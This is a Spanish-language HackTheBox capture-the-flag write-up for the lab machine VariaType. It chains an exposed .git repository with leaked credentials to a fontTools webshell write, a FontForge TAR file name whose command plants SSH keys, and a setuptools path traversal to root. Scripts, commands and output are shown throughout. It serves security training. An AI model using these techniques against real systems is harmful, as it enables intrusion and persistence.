---
title: "VariaType — HackTheBox Writeup"
machine: "VariaType"
platform: "HackTheBox"
os: "Linux"
difficulty: "Medium"
tags: ["CVE", "RCE", "Privesc", "Web"]
retired: true
summary: "VariaType es una máquina Linux de dificultad Medium que presenta un stack de procesamiento de fuentes tipográficas con dos virtual hosts. La cadena de ataque encadena tres CVEs distintos."
draft: false
---
**Autor:** 4Pr3nd1z
**Dificultad:** Medium
**OS:** Linux
**Season:** 10 (Semana 7)
**Fecha:** Junio 2026

---

## 📋 Índice

---

## 📖 Descripción General

VariaType es una máquina Linux de dificultad **Medium** que presenta un stack de procesamiento de fuentes tipográficas con dos virtual hosts. La cadena de ataque encadena tres CVEs distintos para lograr compromiso total del sistema.

**Stack tecnológico:** nginx, Flask (Python), PHP, fontTools, FontForge, setuptools

**CVEs encadenados:**

- `CVE-2025-66034` — fontTools varLib arbitrary file write via XML/CDATA injection
- `CVE-2024-25082` — FontForge TAR filename command injection
- `CVE-2025-47273` — setuptools PackageIndex path traversal

---

## 🔍 Reconocimiento

### Nmap — Escaneo completo

```bash
sudo nmap 10.129.244.202 -p- --open --min-rate 5000 -Pn -n -oG target
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Nmap — Detección de versiones

```bash
sudo nmap 10.129.244.202 -p 22,80 -sCV -Pn -oN targeted
```

```
22/tcp open  ssh     OpenSSH 9.2p1 Debian
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
```

### Hosts

```bash
echo "10.129.244.202 variatype.htb" | sudo tee -a /etc/hosts
```

---

## 🌐 Enumeración Web

### WhatWeb

```bash
whatweb http://variatype.htb/
```

La app principal es un generador de fuentes variables que acepta archivos `.designspace` y `.ttf/.otf`.

### Descubrimiento de Subdominios

```bash
gobuster vhost -u http://variatype.htb/ \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  --append-domain -t 50
```

**Subdominio encontrado:** `portal.variatype.htb`

```bash
sudo sed -i 's/variatype.htb/variatype.htb portal.variatype.htb/' /etc/hosts
```

### Fuzzing de directorios en portal

```bash
gobuster dir -u http://portal.variatype.htb/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -t 50
```

```
/index.php       (Status: 200)
/dashboard.php   (Status: 302) → /
/download.php    (Status: 302) → /
/view.php        (Status: 302) → /
/auth.php        (Status: 200)
/files           (Status: 301)
/.git            (Status: 301)  ← 🔥 CRÍTICO
```

---

## 🔓 Git Disclosure — Credenciales Hardcodeadas

El directorio `.git` está expuesto públicamente en el portal interno.

```bash
git-dumper http://portal.variatype.htb/.git/ source_code/
cd source_code/
git log --oneline
```

```
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

El mensaje "add gitbot user" es sospechoso. Revisamos el diff:

```diff
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];
```

**Credenciales obtenidas:** `gitbot:G1tB0t_Acc3ss_2025!`

Login exitoso en `http://portal.variatype.htb` → Dashboard de validación de fuentes.

> ℹ️ SSH con estas credenciales no funciona — son solo para el portal web.
> 

---

## 💥 CVE-2025-66034 — fontTools Arbitrary File Write

### ¿Qué es?

fontTools varLib procesa archivos `.designspace` (XML) sin sanitizar la ruta de salida. Inyectando un intérprete de comandos de una sola línea dentro de un bloque CDATA y especificando una ruta de salida dentro del webroot, es posible depositar un archivo ejecutable en el servidor.

**Versiones afectadas:** fontTools varLib (instancia en este servidor)

### Exploit

Usamos el exploit público:

```bash
git clone https://github.com/Liquid1998/Variatype.htb-CVE-2025-66034.git
cd Variatype.htb-CVE-2025-66034
pip3 install -r requirements.txt --break-system-packages
```

El exploit sube un `.designspace` malicioso cuyo bloque `<labelname>` contiene, envuelto en CDATA, un intérprete de comandos de una línea (el clásico "ejecutar lo que llegue por parámetro"), y especifica la ruta de salida como:

```
/var/www/portal.variatype.htb/public/files/webshell.php
```

### Verificación de RCE

```bash
python3 exploit.py 'id'
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 🐚 Shell como www-data

La reverse shell directa no funcionaba (firewall bloquea conexiones salientes). Usamos **Penelope** con el payload en base64 (la herramienta lo genera al presionar 'p' en el listener) para establecer la conexión saliente hacia nuestro handler.

Shell interactiva como `www-data` obtenida. ✓

### Enumeración interna

```bash
cat /opt/variatype/app.py     # App Flask principal
cat /opt/process_client_submissions.bak  # Script de procesamiento de fuentes
```

El script de Steve procesa archivos en `/var/www/portal.variatype.htb/public/files/` usando **FontForge** como cron job:

```bash
fontforge -lang=py -c "font = fontforge.open('$file')"
```

---

## 🎯 CVE-2024-25082 — FontForge TAR Filename Injection

### ¿Qué es?

FontForge al procesar archivos TAR pasa el nombre del archivo directamente a una shell sin sanitizar. Un `;` en el nombre del archivo permite inyección de comandos arbitrarios.

**Versiones afectadas:** FontForge ≤ 20230101

### Creación del TAR malicioso

```bash
PUBKEY=$(cat steve_key.pub)

python3 -c "
import tarfile, io
pubkey = open('steve_key.pub').read().strip()
name = f\"exploit.ttf;mkdir -p /home/steve/.ssh && echo '{pubkey}' >> /home/steve/.ssh/authorized_keys && chmod 600 /home/steve/.ssh/authorized_keys;\"
tar = tarfile.open('evil.tar', 'w')
info = tarfile.TarInfo(name=name)
info.size = 4
tar.addfile(info, io.BytesIO(b'AAAA'))
tar.close()
print('evil.tar creado')
"
```

### Entrega del payload

```bash
# Servidor HTTP en Kali
python3 -m http.server 8080

# Desde shell www-data
wget http://10.10.15.55:8080/evil.tar \
  -O /var/www/portal.variatype.htb/public/files/evil.tar
```

El cron de Steve procesa el TAR con FontForge → el nombre malicioso se ejecuta → nuestra clave SSH queda en `/home/steve/.ssh/authorized_keys`.

---

## 🚩 Flag de Usuario

```bash
ssh -i steve_key steve@variatype.htb
cat ~/user.txt
```

```
[REDACTED]
```

---

## ⬆️ Escalada de Privilegios — CVE-2025-47273

### Sudo de Steve

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

### ¿Qué es CVE-2025-47273?

`setuptools.PackageIndex.download()` usa `os.path.join(tmpdir, name)` donde `name` se extrae de la URL sin suficiente sanitización. Si `name` comienza con `/`, `os.path.join` descarta `tmpdir` completamente, permitiendo escritura de archivos en rutas arbitrarias.

Conceptualmente: cuando el nombre de destino resuelto empieza con `/`, `os.path.join` ignora el directorio temporal por completo y escribe en la ruta absoluta indicada.

**Versión instalada:** `78.1.0` (vulnerable — fix en `78.1.1`)

### Verificación del path traversal

```bash
python3 -c "
from setuptools.package_index import egg_info_for_url
url = 'http://10.10.15.55:8080/%2Froot%2F.ssh%2Fauthorized_keys'
name, fragment = egg_info_for_url(url)
print('name:', name)
"
```

```
name: /root/.ssh/authorized_keys
```

El `%2F` URL-encoded bypasea el parser pero setuptools lo decodifica → el `name` empieza con `/` → path traversal exitoso.

### Servidor HTTP malicioso

Un pequeño servidor HTTP local (Python `http.server`/`socketserver`) responde con el contenido de `root_key.pub` cuando se le solicita, exponiéndolo para que `install_validator.py` lo descargue.

### Explotación

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  'http://10.10.15.55:8080/%2Froot%2F.ssh%2Fauthorized_keys'
```

```
[INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

---

## 🏆 Flag de Root

```bash
ssh -i root_key root@variatype.htb
cat /root/root.txt
```

```
[REDACTED]
```

---

## 🗺️ Resumen de la Cadena de Ataque

```
Reconocimiento
      ↓
nmap → nginx + SSH
      ↓
Vhost fuzzing → portal.variatype.htb
      ↓
Gobuster → /.git expuesto
      ↓
git-dumper + git log -p → gitbot:G1tB0t_Acc3ss_2025!
      ↓
Login portal → Dashboard validación de fuentes
      ↓
CVE-2025-66034 (fontTools XML/CDATA injection)
→ archivo ejecutable depositado en /files/
      ↓
RCE como www-data
      ↓
Penelope reverse shell → shell interactiva
      ↓
evil.tar en /files/ con nombre malicioso
      ↓
CVE-2024-25082 (FontForge TAR filename injection)
→ SSH key en /home/steve/.ssh/authorized_keys
      ↓
SSH como steve ──────────────────► user.txt ✓
      ↓
sudo -l → install_validator.py NOPASSWD como root
      ↓
CVE-2025-47273 (setuptools path traversal %2F)
→ root_key.pub en /root/.ssh/authorized_keys
      ↓
SSH como root ───────────────────► root.txt ✓
```

---

## 🛠️ Herramientas Utilizadas

- `nmap` — Escaneo de puertos y versiones
- `gobuster` — Fuzzing de directorios y vhosts
- `git-dumper` — Extracción de repositorio Git expuesto
- `hashcat` — Crackeo de hashes bcrypt
- `penelope` — Shell handler avanzado
- `Python` — Creación de TAR malicioso y servidor HTTP custom
- `ssh-keygen` — Generación de pares de claves SSH

---

## 🏷️ Tags

`git-disclosure` `fonttools` `fontforge` `setuptools` `path-traversal` `cve-2025-66034` `cve-2024-25082` `cve-2025-47273` `arbitrary-file-write` `command-injection` `ssh-key-injection`

---

*Writeup por 4Pr3nd1z — Junio 2026*
